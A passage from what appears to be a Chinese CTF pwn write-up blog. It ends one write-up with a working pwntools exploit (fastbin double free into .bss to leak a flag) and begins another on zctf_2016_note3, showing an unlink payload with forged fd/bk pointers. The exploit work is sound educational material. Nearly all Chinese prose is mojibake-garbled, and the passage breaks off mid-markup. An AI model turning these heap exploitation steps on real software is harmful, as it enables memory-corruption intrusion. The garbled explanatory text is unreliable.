title="å†addä¸€ä¸‹çš„è¯ï¼Œä¼šå…ˆåœ¨biné‡Œå–ï¼Œè¿™é‡Œçš„è¯æŠŠå…ˆåœ¨0x18522b0å’Œ0x2952370å†™ä¸Šå†…å®¹ï¼Œç„¶åå°±æŠŠbiné“¾ç»™æ”¹æ‰äº†0x50çš„fastbinè¿™é‡ŒæŒ‡å‘äº†æœ€åçš„flagåœ°å€"></a>å†addä¸€ä¸‹çš„è¯ï¼Œä¼šå…ˆåœ¨biné‡Œå–ï¼Œè¿™é‡Œçš„è¯æŠŠå…ˆåœ¨0x18522b0å’Œ0x2952370å†™ä¸Šå†…å®¹ï¼Œç„¶åå°±æŠŠbiné“¾ç»™æ”¹æ‰äº†0x50çš„fastbinè¿™é‡ŒæŒ‡å‘äº†æœ€åçš„flagåœ°å€</h4><p><img src="https://i.imgs.ovh/2023/10/16/rujCC.png" alt="image-20231016163754041"></p><p><img src="https://i.imgs.ovh/2023/10/16/ru5cm.png" alt="image-20231016164225408"></p><h4 id="å†addä¸€æ¬¡ä¼šæŠŠå‰é¢ä¸¤ä¸ª0x50å¤§å°çš„fastbinç»™æ‹¿æ‰ï¼Œç„¶åçš„åªå‰©ä¸‹æœ€åä¸€ä¸ªflagçš„å †çš„åœ°å€"><a href="#å†addä¸€æ¬¡ä¼šæŠŠå‰é¢ä¸¤ä¸ª0x50å¤§å°çš„fastbinç»™æ‹¿æ‰ï¼Œç„¶åçš„åªå‰©ä¸‹æœ€åä¸€ä¸ªflagçš„å †çš„åœ°å€" class="headerlink" title="å†addä¸€æ¬¡ä¼šæŠŠå‰é¢ä¸¤ä¸ª0x50å¤§å°çš„fastbinç»™æ‹¿æ‰ï¼Œç„¶åçš„åªå‰©ä¸‹æœ€åä¸€ä¸ªflagçš„å †çš„åœ°å€"></a>å†addä¸€æ¬¡ä¼šæŠŠå‰é¢ä¸¤ä¸ª0x50å¤§å°çš„fastbinç»™æ‹¿æ‰ï¼Œç„¶åçš„åªå‰©ä¸‹æœ€åä¸€ä¸ªflagçš„å †çš„åœ°å€</h4><pre><code class="lang-py">add(0x40,&#39;MMMM&#39;,0x40,&#39;kkkk&#39;)</code></pre><p><img src="https://i.imgs.ovh/2023/10/16/ruv62.png" alt="image-20231016164831150"></p><p><img src="https://i.imgs.ovh/2023/10/16/ruycj.png" alt="image-20231016164848340"></p><h4 id="å†mallocä¸€æ¬¡0x40çš„å¤§å°å°±èƒ½æŠŠflagå †åœ°å€æ”¹å†™åˆ°0x20å¤§å°çš„å †ä¸Šï¼Œä½†æ˜¯ä¸ºäº†ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œå¾—malloc-0x50çš„å¤§å°ï¼Œæ‰€ä»¥å‰é¢ä¹Ÿå¾—æ”¹æˆ0x50çš„å¤§å°ï¼Œå†showçš„è¯å°±ä¼šæŠŠflagè¾“å‡ºå‡ºæ¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç¬¬äº”ä¸ªå †ï¼Œå› ä¸ºå‰é¢çš„bssæ®µä¸Šçš„å †æŒ‡é’ˆéƒ½æ²¡æœ‰ç½®é›¶ã€‚"><a href="#å†mallocä¸€æ¬¡0x40çš„å¤§å°å°±èƒ½æŠŠflagå †åœ°å€æ”¹å†™åˆ°0x20å¤§å°çš„å †ä¸Šï¼Œä½†æ˜¯ä¸ºäº†ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œå¾—malloc-0x50çš„å¤§å°ï¼Œæ‰€ä»¥å‰é¢ä¹Ÿå¾—æ”¹æˆ0x50çš„å¤§å°ï¼Œå†showçš„è¯å°±ä¼šæŠŠflagè¾“å‡ºå‡ºæ¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç¬¬äº”ä¸ªå †ï¼Œå› ä¸ºå‰é¢çš„bssæ®µä¸Šçš„å †æŒ‡é’ˆéƒ½æ²¡æœ‰ç½®é›¶ã€‚" class="headerlink" title="å†mallocä¸€æ¬¡0x40çš„å¤§å°å°±èƒ½æŠŠflagå †åœ°å€æ”¹å†™åˆ°0x20å¤§å°çš„å †ä¸Šï¼Œä½†æ˜¯ä¸ºäº†ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œå¾—malloc 0x50çš„å¤§å°ï¼Œæ‰€ä»¥å‰é¢ä¹Ÿå¾—æ”¹æˆ0x50çš„å¤§å°ï¼Œå†showçš„è¯å°±ä¼šæŠŠflagè¾“å‡ºå‡ºæ¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç¬¬äº”ä¸ªå †ï¼Œå› ä¸ºå‰é¢çš„bssæ®µä¸Šçš„å †æŒ‡é’ˆéƒ½æ²¡æœ‰ç½®é›¶ã€‚"></a>å†mallocä¸€æ¬¡0x40çš„å¤§å°å°±èƒ½æŠŠflagå †åœ°å€æ”¹å†™åˆ°0x20å¤§å°çš„å †ä¸Šï¼Œä½†æ˜¯ä¸ºäº†ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œå¾—malloc 0x50çš„å¤§å°ï¼Œæ‰€ä»¥å‰é¢ä¹Ÿå¾—æ”¹æˆ0x50çš„å¤§å°ï¼Œå†showçš„è¯å°±ä¼šæŠŠflagè¾“å‡ºå‡ºæ¥ï¼Œæ³¨æ„è¿™é‡Œæ˜¯ç¬¬äº”ä¸ªå †ï¼Œå› ä¸ºå‰é¢çš„bssæ®µä¸Šçš„å †æŒ‡é’ˆéƒ½æ²¡æœ‰ç½®é›¶ã€‚</h4><pre><code class="lang-py">show(4)</code></pre><h4 id="æƒ³åœ¨bssæ®µä¸Šç”³è¯·å †ï¼Œéœ€è¦0x50çš„å¤§å°æ‰èƒ½ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œè¿™é‡Œé€‰0x602098åˆšå¥½ã€‚"><a href="#æƒ³åœ¨bssæ®µä¸Šç”³è¯·å †ï¼Œéœ€è¦0x50çš„å¤§å°æ‰èƒ½ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œè¿™é‡Œé€‰0x602098åˆšå¥½ã€‚" class="headerlink" title="æƒ³åœ¨bssæ®µä¸Šç”³è¯·å †ï¼Œéœ€è¦0x50çš„å¤§å°æ‰èƒ½ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œè¿™é‡Œé€‰0x602098åˆšå¥½ã€‚"></a>æƒ³åœ¨bssæ®µä¸Šç”³è¯·å †ï¼Œéœ€è¦0x50çš„å¤§å°æ‰èƒ½ç»•è¿‡fastbinçš„æ£€æŸ¥ï¼Œè¿™é‡Œé€‰0x602098åˆšå¥½ã€‚</h4><p><img src="https://i.imgs.ovh/2023/10/16/r7XdW.png" alt="image-20231016170214324"></p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre><code class="lang-py">from pwn import*from LibcSearcher import *#p=remote(&quot;node4.buuoj.cn&quot;,26884)p=process(&quot;./gyctf_2020_some_thing_exceting&quot;)elf=ELF(&#39;./gyctf_2020_some_thing_exceting&#39;)libc=ELF(&#39;./libc-2.23.so&#39;)context.log_level=&quot;debug&quot;def add(size1,content1,size2,content2):    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;1&#39;)    p.sendlineafter(&quot;&gt; ba&#39;s length : &quot;,str(size1))    p.sendlineafter(&#39;&gt; ba : &#39;,content1)    p.sendlineafter(&quot;&gt; na&#39;s length : &quot;,str(size2))    p.sendlineafter(&#39;&gt; na : &#39;,content2)def dele(index):    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;3&#39;)    p.sendlineafter(&#39;Banana ID :&#39;,str(index))def show(index):    p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;4&#39;)    p.sendlineafter(&#39;&gt; Banana ID : &gt; SCP project ID : &#39;,str(index))bss=0x6020a8-0x10add(0x50,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;)add(0x50,&#39;AAAA&#39;,0x50,&#39;BBBB&#39;)dele(0)dele(1)dele(0)add(0x50,p64(bss),0x50,&#39;AAAA&#39;)add(0x50,&#39;MMMM&#39;,0x50,&#39;kkkk&#39;)add(0x50,b&#39;1&#39;,0x60,b&#39;&#39;)show(4)#gdb.attach(p)sleep(1)#pause()#dele(0)#p.sendline(payload)p.interactive()</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/10/14/zctf_2016_note3/"/>
      <url>/2023/10/14/zctf_2016_note3/</url>
      
        <content type="html"><![CDATA[<h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><h4 id="è¿™é“é¢˜å‡½æ•°è¾ƒå¤šï¼Œä½†æ˜¯ç›¸å¯¹æ¥è¯´è¿˜æ˜¯ä¸€èˆ¬çš„å †é¢˜ï¼Œå‡½æ•°å¤šå¯ä¸€å¤šç†è§£ï¼Œä¸‹é¢å¼€å§‹ä¸€ä¸€è®²è§£ã€‚"><a href="#è¿™é“é¢˜å‡½æ•°è¾ƒå¤šï¼Œä½†æ˜¯ç›¸å¯¹æ¥è¯´è¿˜æ˜¯ä¸€èˆ¬çš„å †é¢˜ï¼Œå‡½æ•°å¤šå¯ä¸€å¤šç†è§£ï¼Œä¸‹é¢å¼€å§‹ä¸€ä¸€è®²è§£ã€‚" class="headerlink" title="è¿™é“é¢˜å‡½æ•°è¾ƒå¤šï¼Œä½†æ˜¯ç›¸å¯¹æ¥è¯´è¿˜æ˜¯ä¸€èˆ¬çš„å †é¢˜ï¼Œå‡½æ•°å¤šå¯ä¸€å¤šç†è§£ï¼Œä¸‹é¢å¼€å§‹ä¸€ä¸€è®²è§£ã€‚"></a>è¿™é“é¢˜å‡½æ•°è¾ƒå¤šï¼Œä½†æ˜¯ç›¸å¯¹æ¥è¯´è¿˜æ˜¯ä¸€èˆ¬çš„å †é¢˜ï¼Œå‡½æ•°å¤šå¯ä¸€å¤šç†è§£ï¼Œä¸‹é¢å¼€å§‹ä¸€ä¸€è®²è§£ã€‚</h4><h4 id="å…ˆçœ‹addå‡½æ•°"><a href="#å…ˆçœ‹addå‡½æ•°" class="headerlink" title="å…ˆçœ‹addå‡½æ•°"></a>å…ˆçœ‹addå‡½æ•°</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAZ7T.png" alt="image-20231014214742855"></p><h4 id="ç¬¬åäºŒè¡Œçš„sizeå‡½æ•°ï¼Œæ˜¯ç”¨æ¥è¾“å…¥æˆ‘ä»¬è¦ç”³è¯·å¤§å°çš„å †ï¼Œç‚¹è¿›å»çœ‹æœ‰ç‚¹å¤æ‚ï¼Œä½†å…¶å®å’Œscanfå·®ä¸å¤šï¼Œé‡Œé¢è¿˜æœ‰ä¸ªsub-4008ddçš„å‡½æ•°ï¼Œå†ç‚¹è¿›å»"><a href="#ç¬¬åäºŒè¡Œçš„sizeå‡½æ•°ï¼Œæ˜¯ç”¨æ¥è¾“å…¥æˆ‘ä»¬è¦ç”³è¯·å¤§å°çš„å †ï¼Œç‚¹è¿›å»çœ‹æœ‰ç‚¹å¤æ‚ï¼Œä½†å…¶å®å’Œscanfå·®ä¸å¤šï¼Œé‡Œé¢è¿˜æœ‰ä¸ªsub-4008ddçš„å‡½æ•°ï¼Œå†ç‚¹è¿›å»" class="headerlink" title="ç¬¬åäºŒè¡Œçš„sizeå‡½æ•°ï¼Œæ˜¯ç”¨æ¥è¾“å…¥æˆ‘ä»¬è¦ç”³è¯·å¤§å°çš„å †ï¼Œç‚¹è¿›å»çœ‹æœ‰ç‚¹å¤æ‚ï¼Œä½†å…¶å®å’Œscanfå·®ä¸å¤šï¼Œé‡Œé¢è¿˜æœ‰ä¸ªsub_4008ddçš„å‡½æ•°ï¼Œå†ç‚¹è¿›å»"></a>ç¬¬åäºŒè¡Œçš„sizeå‡½æ•°ï¼Œæ˜¯ç”¨æ¥è¾“å…¥æˆ‘ä»¬è¦ç”³è¯·å¤§å°çš„å †ï¼Œç‚¹è¿›å»çœ‹æœ‰ç‚¹å¤æ‚ï¼Œä½†å…¶å®å’Œscanfå·®ä¸å¤šï¼Œé‡Œé¢è¿˜æœ‰ä¸ªsub_4008ddçš„å‡½æ•°ï¼Œå†ç‚¹è¿›å»</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFTgo.png" alt="image-20231012210324374"></p><h4 id="sub-4008ddå‡½æ•°ï¼Œè¿™ä¸ªç›¸å½“äºreadå‡½æ•°ï¼Œåœ¨ä¸‹é¢çš„å¥½å‡ ä¸ªå‡½æ•°éƒ½è°ƒç”¨åˆ°ï¼Œå…ˆçœ‹å‡½æ•°çš„å‚æ•°ç¬¬ä¸‰ä¸ªå‚æ•°-char-a3ï¼Œå…¶å€¼æ˜¯10ï¼Œç¬¬ä¸€ä¸ªå‚æ•°a1æ˜¯è¾“å…¥çš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯è¾“å…¥çš„sizeï¼Œä¸€ä¸ªä¸ªè¾“å…¥ä¿å­˜åœ¨v7ä¸­ä½†æ˜¯æœ€é•¿ä¸ä¼šè¶…è¿‡32çš„é•¿åº¦ï¼Œé‡åˆ°â€™-x00â€™æ—¶ç»“æŸï¼Œè¿™é‡Œçš„a3-10å…¶å®å°±æ˜¯æˆªæ­¢ç¬¦â€™-xaâ€™ï¼Œåé¢ä¸¤æ¡å·²ç»ä¸é‡è¦äº†ã€‚"><a href="#sub-4008ddå‡½æ•°ï¼Œè¿™ä¸ªç›¸å½“äºreadå‡½æ•°ï¼Œåœ¨ä¸‹é¢çš„å¥½å‡ ä¸ªå‡½æ•°éƒ½è°ƒç”¨åˆ°ï¼Œå…ˆçœ‹å‡½æ•°çš„å‚æ•°ç¬¬ä¸‰ä¸ªå‚æ•°-char-a3ï¼Œå…¶å€¼æ˜¯10ï¼Œç¬¬ä¸€ä¸ªå‚æ•°a1æ˜¯è¾“å…¥çš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯è¾“å…¥çš„sizeï¼Œä¸€ä¸ªä¸ªè¾“å…¥ä¿å­˜åœ¨v7ä¸­ä½†æ˜¯æœ€é•¿ä¸ä¼šè¶…è¿‡32çš„é•¿åº¦ï¼Œé‡åˆ°â€™-x00â€™æ—¶ç»“æŸï¼Œè¿™é‡Œçš„a3-10å…¶å®å°±æ˜¯æˆªæ­¢ç¬¦â€™-xaâ€™ï¼Œåé¢ä¸¤æ¡å·²ç»ä¸é‡è¦äº†ã€‚" class="headerlink" title="sub_4008ddå‡½æ•°ï¼Œè¿™ä¸ªç›¸å½“äºreadå‡½æ•°ï¼Œåœ¨ä¸‹é¢çš„å¥½å‡ ä¸ªå‡½æ•°éƒ½è°ƒç”¨åˆ°ï¼Œå…ˆçœ‹å‡½æ•°çš„å‚æ•°ç¬¬ä¸‰ä¸ªå‚æ•° char a3ï¼Œå…¶å€¼æ˜¯10ï¼Œç¬¬ä¸€ä¸ªå‚æ•°a1æ˜¯è¾“å…¥çš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯è¾“å…¥çš„sizeï¼Œä¸€ä¸ªä¸ªè¾“å…¥ä¿å­˜åœ¨v7ä¸­ä½†æ˜¯æœ€é•¿ä¸ä¼šè¶…è¿‡32çš„é•¿åº¦ï¼Œé‡åˆ°â€™\x00â€™æ—¶ç»“æŸï¼Œè¿™é‡Œçš„a3=10å…¶å®å°±æ˜¯æˆªæ­¢ç¬¦â€™\xaâ€™ï¼Œåé¢ä¸¤æ¡å·²ç»ä¸é‡è¦äº†ã€‚"></a>sub_4008ddå‡½æ•°ï¼Œè¿™ä¸ªç›¸å½“äºreadå‡½æ•°ï¼Œåœ¨ä¸‹é¢çš„å¥½å‡ ä¸ªå‡½æ•°éƒ½è°ƒç”¨åˆ°ï¼Œå…ˆçœ‹å‡½æ•°çš„å‚æ•°ç¬¬ä¸‰ä¸ªå‚æ•° char a3ï¼Œå…¶å€¼æ˜¯10ï¼Œç¬¬ä¸€ä¸ªå‚æ•°a1æ˜¯è¾“å…¥çš„åœ°å€ï¼Œç¬¬äºŒä¸ªæ˜¯è¾“å…¥çš„sizeï¼Œä¸€ä¸ªä¸ªè¾“å…¥ä¿å­˜åœ¨v7ä¸­ä½†æ˜¯æœ€é•¿ä¸ä¼šè¶…è¿‡32çš„é•¿åº¦ï¼Œé‡åˆ°â€™\x00â€™æ—¶ç»“æŸï¼Œè¿™é‡Œçš„a3=10å…¶å®å°±æ˜¯æˆªæ­¢ç¬¦â€™\xaâ€™ï¼Œåé¢ä¸¤æ¡å·²ç»ä¸é‡è¦äº†ã€‚</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFEWD.png" alt="image-20231012210438919"></p><h4 id="æœ€åè¿”å›çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬åäºŒè¡Œsizeçš„å€¼ã€‚ç¬¬åä¹è¡Œçš„sub-4008ddå‡½æ•°ä¹Ÿæ˜¯åŒç†ï¼Œä¸è¿‡è¾“å…¥çš„é•¿åº¦æœ‰sizeå†³å®šã€‚å¤–é¢çš„sub-400a30å‡½æ•°é‡Œçš„nptræ˜¯åœ¨bssæ®µä¸Šçš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„åœ°å€ï¼Œç¬¬ä¸€ä¸ªå­˜æ”¾åœ°å€ï¼Œç¬¬äºŒä¸ªåŠ å…«çš„åœ°å€å­˜æ”¾size"><a href="#æœ€åè¿”å›çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬åäºŒè¡Œsizeçš„å€¼ã€‚ç¬¬åä¹è¡Œçš„sub-4008ddå‡½æ•°ä¹Ÿæ˜¯åŒç†ï¼Œä¸è¿‡è¾“å…¥çš„é•¿åº¦æœ‰sizeå†³å®šã€‚å¤–é¢çš„sub-400a30å‡½æ•°é‡Œçš„nptræ˜¯åœ¨bssæ®µä¸Šçš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„åœ°å€ï¼Œç¬¬ä¸€ä¸ªå­˜æ”¾åœ°å€ï¼Œç¬¬äºŒä¸ªåŠ å…«çš„åœ°å€å­˜æ”¾size" class="headerlink" title="æœ€åè¿”å›çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬åäºŒè¡Œsizeçš„å€¼ã€‚ç¬¬åä¹è¡Œçš„sub_4008ddå‡½æ•°ä¹Ÿæ˜¯åŒç†ï¼Œä¸è¿‡è¾“å…¥çš„é•¿åº¦æœ‰sizeå†³å®šã€‚å¤–é¢çš„sub_400a30å‡½æ•°é‡Œçš„nptræ˜¯åœ¨bssæ®µä¸Šçš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„åœ°å€ï¼Œç¬¬ä¸€ä¸ªå­˜æ”¾åœ°å€ï¼Œç¬¬äºŒä¸ªåŠ å…«çš„åœ°å€å­˜æ”¾size"></a>æœ€åè¿”å›çš„æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬åäºŒè¡Œsizeçš„å€¼ã€‚ç¬¬åä¹è¡Œçš„sub_4008ddå‡½æ•°ä¹Ÿæ˜¯åŒç†ï¼Œä¸è¿‡è¾“å…¥çš„é•¿åº¦æœ‰sizeå†³å®šã€‚å¤–é¢çš„sub_400a30å‡½æ•°é‡Œçš„nptræ˜¯åœ¨bssæ®µä¸Šçš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„åœ°å€ï¼Œç¬¬ä¸€ä¸ªå­˜æ”¾åœ°å€ï¼Œç¬¬äºŒä¸ªåŠ å…«çš„åœ°å€å­˜æ”¾size</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFqNA.png" alt="image-20231012211843683"></p><h4 id="editå‡½æ•°ï¼Œå…ˆçœ‹ç¬¬16è¡Œçš„readå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°-amp-ptr-v3-å…¶å®å°±æ˜¯å­˜åœ¨å †ä¸Šçš„åœ°å€ï¼Œv3æŒ‡çš„ç¬¬å‡ ä¸ªå †ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå°±æ˜¯bsså­˜å †åœ°å€å†åŠ 8çš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„å¤§å°ï¼Œå’ŒåŸæ¥çš„ä¸€æ ·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å †æº¢å‡ºçš„æƒ…å†µã€‚"><a href="#editå‡½æ•°ï¼Œå…ˆçœ‹ç¬¬16è¡Œçš„readå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°-amp-ptr-v3-å…¶å®å°±æ˜¯å­˜åœ¨å †ä¸Šçš„åœ°å€ï¼Œv3æŒ‡çš„ç¬¬å‡ ä¸ªå †ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå°±æ˜¯bsså­˜å †åœ°å€å†åŠ 8çš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„å¤§å°ï¼Œå’ŒåŸæ¥çš„ä¸€æ ·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å †æº¢å‡ºçš„æƒ…å†µã€‚" class="headerlink" title="editå‡½æ•°ï¼Œå…ˆçœ‹ç¬¬16è¡Œçš„readå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° *(&amp;ptr + v3)å…¶å®å°±æ˜¯å­˜åœ¨å †ä¸Šçš„åœ°å€ï¼Œv3æŒ‡çš„ç¬¬å‡ ä¸ªå †ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå°±æ˜¯bsså­˜å †åœ°å€å†åŠ 8çš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„å¤§å°ï¼Œå’ŒåŸæ¥çš„ä¸€æ ·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å †æº¢å‡ºçš„æƒ…å†µã€‚"></a>editå‡½æ•°ï¼Œå…ˆçœ‹ç¬¬16è¡Œçš„readå‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•° *(&amp;ptr + v3)å…¶å®å°±æ˜¯å­˜åœ¨å †ä¸Šçš„åœ°å€ï¼Œv3æŒ‡çš„ç¬¬å‡ ä¸ªå †ï¼Œç¬¬äºŒä¸ªå‚æ•°ï¼Œå°±æ˜¯bsså­˜å †åœ°å€å†åŠ 8çš„åœ°å€ï¼Œå­˜æ”¾çš„æ˜¯mallocçš„å¤§å°ï¼Œå’ŒåŸæ¥çš„ä¸€æ ·ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å †æº¢å‡ºçš„æƒ…å†µã€‚</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFGp5.png" alt="image-20231012212200515"></p><h4 id="deleå‡½æ•°ï¼Œbssæ®µä¸Šçš„åœ°å€æ¸…é›¶ï¼Œå †ä¸Šçš„å†…å®¹ä¹Ÿè¢«é‡Šæ”¾äº†ï¼Œæ‰€ä»¥å¹¶ä¸å­˜åœ¨UAFæ¼æ´"><a href="#deleå‡½æ•°ï¼Œbssæ®µä¸Šçš„åœ°å€æ¸…é›¶ï¼Œå †ä¸Šçš„å†…å®¹ä¹Ÿè¢«é‡Šæ”¾äº†ï¼Œæ‰€ä»¥å¹¶ä¸å­˜åœ¨UAFæ¼æ´" class="headerlink" title="deleå‡½æ•°ï¼Œbssæ®µä¸Šçš„åœ°å€æ¸…é›¶ï¼Œå †ä¸Šçš„å†…å®¹ä¹Ÿè¢«é‡Šæ”¾äº†ï¼Œæ‰€ä»¥å¹¶ä¸å­˜åœ¨UAFæ¼æ´"></a>deleå‡½æ•°ï¼Œbssæ®µä¸Šçš„åœ°å€æ¸…é›¶ï¼Œå †ä¸Šçš„å†…å®¹ä¹Ÿè¢«é‡Šæ”¾äº†ï¼Œæ‰€ä»¥å¹¶ä¸å­˜åœ¨UAFæ¼æ´</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFN7s.png" alt="image-20231012212926978"></p><h4 id="é‡ç‚¹çš„åœ°æ–¹åœ¨è¿™ï¼Œå°±æ˜¯unlinkçš„æ€ä¹ˆæ„é€ ã€‚"><a href="#é‡ç‚¹çš„åœ°æ–¹åœ¨è¿™ï¼Œå°±æ˜¯unlinkçš„æ€ä¹ˆæ„é€ ã€‚" class="headerlink" title="é‡ç‚¹çš„åœ°æ–¹åœ¨è¿™ï¼Œå°±æ˜¯unlinkçš„æ€ä¹ˆæ„é€ ã€‚"></a>é‡ç‚¹çš„åœ°æ–¹åœ¨è¿™ï¼Œå°±æ˜¯unlinkçš„æ€ä¹ˆæ„é€ ã€‚</h4><h4 id="å…ˆæ„é€ å››ä¸ªä¸ªå †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå †å †0çš„fdå’ŒbkæŒ‡é’ˆåˆ†åˆ«æ”¾fd-ptr-0x18å’Œbk-ptr-0x10ï¼ŒåæœŸä¼šè¿›è¡Œå’Œå¹¶"><a href="#å…ˆæ„é€ å››ä¸ªä¸ªå †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå †å †0çš„fdå’ŒbkæŒ‡é’ˆåˆ†åˆ«æ”¾fd-ptr-0x18å’Œbk-ptr-0x10ï¼ŒåæœŸä¼šè¿›è¡Œå’Œå¹¶" class="headerlink" title="å…ˆæ„é€ å››ä¸ªä¸ªå †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå †å †0çš„fdå’ŒbkæŒ‡é’ˆåˆ†åˆ«æ”¾fd=ptr-0x18å’Œbk=ptr-0x10ï¼ŒåæœŸä¼šè¿›è¡Œå’Œå¹¶"></a>å…ˆæ„é€ å››ä¸ªä¸ªå †å—ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå †å †0çš„fdå’ŒbkæŒ‡é’ˆåˆ†åˆ«æ”¾fd=ptr-0x18å’Œbk=ptr-0x10ï¼ŒåæœŸä¼šè¿›è¡Œå’Œå¹¶</h4><pre><code class="lang-py">ptr=0x6020c8fd=ptr-0x18bk=ptr-0x10payload1=p64(0)+p64(0xb1)+p64(fd)+p64(bk)add(0x90,payload1) #å †0add(0,&#39;bbbb&#39;)      #å †1add(0x90,&#39;CCCC&#39;)   #å †2add(0x10,&#39;dddd&#39;)   #å †3 dele(1)</code></pre><h4 id="å…³äºç¬¬äºŒä¸ªå †å—ï¼Œæˆ‘ä»¬ç”³è¯·çš„æ˜¯0çš„å¤§å°ï¼Œä½†æ˜¯ptmallocä¼šæœ€å°‘ç”³è¯·0x10-åæœŸeditçš„æ—¶å€™æ˜¯å¯ä»¥æº¢å‡ºçš„ï¼Œä»è€Œè¦†ç›–æ‰å †æŒ‡é’ˆã€‚è¿™é‡Œä¼šæœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸ºä»€ä¹ˆä¸åœ¨ç¬¬ä¸€æ¬¡mallocå †1çš„æ—¶å€™å†™å…¥payload2ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡çš„è¯äº‹æº¢å‡ºä¸åˆ°å †2"><a href="#å…³äºç¬¬äºŒä¸ªå †å—ï¼Œæˆ‘ä»¬ç”³è¯·çš„æ˜¯0çš„å¤§å°ï¼Œä½†æ˜¯ptmallocä¼šæœ€å°‘ç”³è¯·0x10-åæœŸeditçš„æ—¶å€™æ˜¯å¯ä»¥æº¢å‡ºçš„ï¼Œä»è€Œè¦†ç›–æ‰å †æŒ‡é’ˆã€‚è¿™é‡Œä¼šæœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸ºä»€ä¹ˆä¸åœ¨ç¬¬ä¸€æ¬¡mallocå †1çš„æ—¶å€™å†™å…¥payload2ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡çš„è¯äº‹æº¢å‡ºä¸åˆ°å †2" class="headerlink" title="å…³äºç¬¬äºŒä¸ªå †å—ï¼Œæˆ‘ä»¬ç”³è¯·çš„æ˜¯0çš„å¤§å°ï¼Œä½†æ˜¯ptmallocä¼šæœ€å°‘ç”³è¯·0x10,åæœŸeditçš„æ—¶å€™æ˜¯å¯ä»¥æº¢å‡ºçš„ï¼Œä»è€Œè¦†ç›–æ‰å †æŒ‡é’ˆã€‚è¿™é‡Œä¼šæœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸ºä»€ä¹ˆä¸åœ¨ç¬¬ä¸€æ¬¡mallocå †1çš„æ—¶å€™å†™å…¥payload2ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡çš„è¯äº‹æº¢å‡ºä¸åˆ°å †2"></a>å…³äºç¬¬äºŒä¸ªå †å—ï¼Œæˆ‘ä»¬ç”³è¯·çš„æ˜¯0çš„å¤§å°ï¼Œä½†æ˜¯ptmallocä¼šæœ€å°‘ç”³è¯·0x10,åæœŸeditçš„æ—¶å€™æ˜¯å¯ä»¥æº¢å‡ºçš„ï¼Œä»è€Œè¦†ç›–æ‰å †æŒ‡é’ˆã€‚è¿™é‡Œä¼šæœ‰ä¸ªé—®é¢˜å°±æ˜¯ä¸ºä»€ä¹ˆä¸åœ¨ç¬¬ä¸€æ¬¡mallocå †1çš„æ—¶å€™å†™å…¥payload2ï¼Œå› ä¸ºç¬¬ä¸€æ¬¡çš„è¯äº‹æº¢å‡ºä¸åˆ°å †2</h4><pre><code class="lang-py\">payload2=p64(0)*2+p64(0xb0)+p64(0xa0)add(0,payload2)</code></pre><h4 id="è¦†ç›–åçš„å †å—æ˜¯é•¿è¿™æ ·çš„ï¼ŒæŠŠç¬¬å †2çš„å¤§å°å’Œå®ƒçš„previous-in-useä½æ”¹æˆäº†0-ä¹Ÿå°±æ˜¯ä¸Šä¸€ä¸ªå †å †1æ²¡æœ‰ä½¿ç”¨"><a href="#è¦†ç›–åçš„å †å—æ˜¯é•¿è¿™æ ·çš„ï¼ŒæŠŠç¬¬å 